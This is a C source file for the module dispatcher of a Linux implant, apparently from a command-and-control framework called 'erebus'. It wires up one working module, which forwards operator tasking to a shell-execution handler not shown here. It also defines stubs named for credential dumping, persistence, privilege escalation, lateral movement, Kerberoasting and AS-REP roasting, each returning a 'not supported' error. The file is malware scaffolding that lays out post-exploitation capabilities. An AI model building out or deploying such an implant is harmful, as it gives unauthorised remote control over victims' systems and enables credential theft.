/*
 * Linux C implant modules: shell only (matches Go thin Linux peer basics).
 * AD / lateral / Windows post-ex modules hard-fail with explicit error bytes.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/modules.h"
#include "erebus/task_handlers.h"

int erebus_mod_shell(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    return erebus_task_shell_execute(config, config_len, out, out_len);
}

/* Return 0; put human-readable reason in *out for executor to surface. */
static int fail_named(const char *name, uint8_t **o, size_t *ol) {
    char buf[160];
    int n = snprintf(buf, sizeof(buf), "not supported on linux c implant: %s", name ? name : "?");
    if (n < 0) n = 0;
    if ((size_t)n >= sizeof(buf)) n = (int)sizeof(buf) - 1;
    if (!o || !ol) return 0;
    *o = (uint8_t *)malloc((size_t)n + 1);
    if (!*o) {
        *ol = 0;
        return 0;
    }
    memcpy(*o, buf, (size_t)n + 1);
    *ol = (size_t)n;
    return 0;
}

int erebus_mod_creds_dump(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("creds_dump", o, ol);
}
int erebus_mod_cloud(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("cloud", o, ol);
}
int erebus_mod_persist(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("persist", o, ol);
}
int erebus_mod_privesc(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("privesc", o, ol);
}
int erebus_mod_lateral_move(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("lateral", o, ol);
}
int erebus_mod_ldap_enum(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("ldap_enum", o, ol);
}
int erebus_mod_kerberoast(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("kerberoast", o, ol);
}
int erebus_mod_asreproast(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("asreproast", o, ol);
}

static const struct {
    const char       *name;
    erebus_module_fn  fn;
} g_modules[] = {
    { "shell", erebus_mod_shell },
};

int erebus_module_execute(const char *name, const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    if (!name || !name[0]) return fail_named("unknown", out, out_len);
    for (size_t i = 0; i < sizeof(g_modules) / sizeof(g_modules[0]); i++) {
        if (strcmp(g_modules[i].name, name) == 0)
            return g_modules[i].fn(config, config_len, out, out_len);
    }
    return fail_named(name, out, out_len);
}
